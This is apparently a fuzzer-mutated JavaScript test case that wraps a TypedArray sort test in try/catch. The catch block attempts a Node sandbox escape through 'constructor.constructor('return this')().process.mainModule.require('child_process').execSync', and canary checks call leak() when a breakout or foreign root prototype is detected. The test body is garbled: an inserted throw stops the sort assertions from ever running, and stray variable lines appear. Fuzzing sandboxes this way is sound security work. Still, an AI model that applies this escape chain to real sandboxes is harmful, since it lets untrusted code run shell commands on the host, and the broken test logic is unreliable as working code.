try {
    const compare = (a, b) => {
        let REPLACER = 23;
        return (a / 4 | 0) - (b / 4 | 0);
    };
    testWithTypedArrayConstructors(TA => {
        let REPLACER = 23;
        const array = Array.from({ length: 128 }, (_, i) => {
            throw () => {
                return () => {
                };
            };
            return i;
        });
        const typedArray1 = new TA(array);
        assert(compareArray(typedArray1.sort(compare), array), 'pre-sorted');
        array.reverse();
        const typedArray2 = new TA(array);
        assert(compareArray(typedArray2.sort(compare), [
            3,
            2,
            1,
            0,
            7,
            6,
            5,
            4,
            11,
            10,
            9,
            8,
            15,
            14,
            13,
            12,
            19,
            18,
            17,
            16,
            23,
            22,
            21,
            20,
            27,
            26,
            25,
            24,
            31,
            30,
            29,
            28,
            35,
            34,
            33,
            32,
            39,
            38,
            37,
            36,
            43,
            42,
            41,
            40,
            47,
            46,
            45,
            44,
            51,
            50,
            49,
            48,
            55,
            54,
            53,
            52,
            59,
            58,
            57,
            56,
            63,
            62,
            61,
            60,
            67,
            66,
            65,
            64,
            71,
            70,
            69,
            68,
            75,
            74,
            73,
            72,
            79,
            78,
            77,
            76,
            83,
            82,
            81,
            80,
            87,
            86,
            85,
            84,
            91,
            90,
            89,
            88,
            95,
            94,
            93,
            92,
            99,
            98,
            97,
            96,
            103,
            102,
            101,
            100,
            107,
            106,
            105,
            104,
            111,
            110,
            109,
            108,
            115,
            114,
            113,
            112,
            119,
            118,
            117,
            116,
            123,
            122,
            121,
            120,
            127,
            126,
            125,
            124
        ]), 'not presorted');
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}